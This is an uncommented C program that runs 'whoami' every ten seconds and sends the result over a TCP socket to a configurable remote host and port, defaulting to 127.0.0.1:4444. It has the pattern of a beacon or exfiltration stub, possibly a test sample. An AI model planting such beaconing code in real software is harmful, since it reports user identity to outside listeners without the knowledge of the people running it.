#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/file.h>
#include <errno.h>
#include <arpa/inet.h>

#ifndef REMOTE_PORT
#define REMOTE_PORT 4444
#endif

#ifndef REMOTE_HOST
#define REMOTE_HOST "127.0.0.1"
#endif

int open_sock(char* ip, u_int16_t port) {
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
        return -1;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) >= 0) {
        return sock;
    }
    close(sock);
    return -1;
}

void send_identity() {
    
    char buffer[1024] = {0};

    FILE *pp = popen("whoami", "r");
    if (pp != NULL) {
        fgets(buffer, sizeof(buffer), pp);
        pclose(pp);
    }

    int sock = open_sock(REMOTE_HOST, REMOTE_PORT);
    if (sock > 0) {
        send(sock, buffer, strlen(buffer), 0);
        close(sock);
    } else {
        perror("failed to open a tcp socket\n");
    }
}

int main() {
    while (1) {
        send_identity();
        sleep(10);
    }
    return 0;
}
